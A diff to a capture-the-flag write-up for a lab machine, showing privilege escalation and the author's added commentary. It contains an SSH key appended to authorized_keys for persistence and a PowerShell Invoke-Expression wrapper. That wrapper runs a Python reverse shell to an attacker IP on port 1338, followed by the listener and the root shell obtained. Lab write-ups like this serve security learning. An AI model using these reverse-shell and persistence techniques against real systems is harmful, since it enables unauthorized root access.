@@ -158,7 +158,7 @@ In the users home directory, there's a hidden remember_password file containing 
 punt4n0@sun:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkrnF0/hTQnKX+0JaqGWRxa3uPiccU/kefcnwdc3Y+7Mw/slKYugyQXxvXTVE38wQFKF0MpoYfbGkn1d5HVjwLc5F6mmOKrsAfbbsPjbJC7NIWOtDiybHHOxbMmUkiHkCOZjy0A2ajNlhU83jnofNC/opQctdH9rBiBdFvy+Dsn8YD/P3sOnFFTnekOe8EC13DPzqheGuVTI88wczOmFVOSOpKbMs289cXvAwHivCC/ghoiyNWDrwwuKn6LdLowTrXEhbBWYHi+MlSblHipgYH44BNoI9uRSUbqer45kUcqjpLpSEHEhE+u2xoQRZIseuFNl1b+AklDzsSDFZEC7dxhafGnNMS1D99cpZQwEWfm0rPYCIE2/7cjxzxECvxR9GZd2nfVt1v8KSP4fQ7VpMv/sVipSdgSAYQ70TUcxAQ1R8Whpn4cBLxwjwA1QGAgJ9h7GcPvv8biE/6yJHFSC4b6QnzQbrOUSZRCMyAI4Dsa3K5DdXdiWNaohurF2pPWiU= rami@zen" | tee -a ~/.ssh/authorized_keys
 ```
 
-in the /opt/ directory there is a service.ps1 powershell script that belongs to the root user and is writable by us, reading the script
+we can establish a stable shell with ssh and continue to pwn the box - in the /opt/ directory there is a `service.ps1` powershell script that belongs to the root user and is writable by us, reading the script
 ```shell
 punt4n0@sun:/opt$ ls -la 
 total 16
@@ -168,7 +168,7 @@ drwx------  3 root root 4096 abr  1 18:53 microsoft
 -rwx---rw-  1 root root   97 abr  2 10:58 service.ps1
 ```
 
-it saves the output of the id command to /dev/shm/out file, its possible a process executes the script in the backgorund so we can run commands as root effectively once we are able to write a powershell script to execute a linux command, I did this with IEX and nano ike this : 
+it saves the output of the id command to /dev/shm/out file, its possible a process executes the script in the backgorund (this box was so twisted and didnt also have binaries you would use for file transfer, one way to go about that would be to use the bash exec /dev/tcp technique) so we can run commands as root effectively once we are able to write a powershell script to execute a linux command, I did this with powershell IEX and put the following content with nano (only a python or maybe perl shell would work, bash didnt work for some reason, if you know why I'd love to discuss that on discord @hesrami) : 
 ```shell
 punt4n0@sun:/opt$ cat service.ps1 
 $command = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""192.168.174.129"",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(""bash"")'"
@@ -176,7 +176,7 @@ $command = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_IN
 Invoke-Expression -Command $command
 ```
 
-and received a reverse shell on port 1338
+and receive a reverse shell on port 1338 as root.
 ```shell
 ┌──(rami㉿zen)-[~/labs/vulnyx/sun]
 └─$ ncat -nvlp 1338
@@ -203,3 +203,4 @@ Operating System: Debian GNU/Linux 12 (bookworm)
 Firmware Version: 6.00
 root@sun:~# 
 ```
+Another amazing box from d4t4sec!
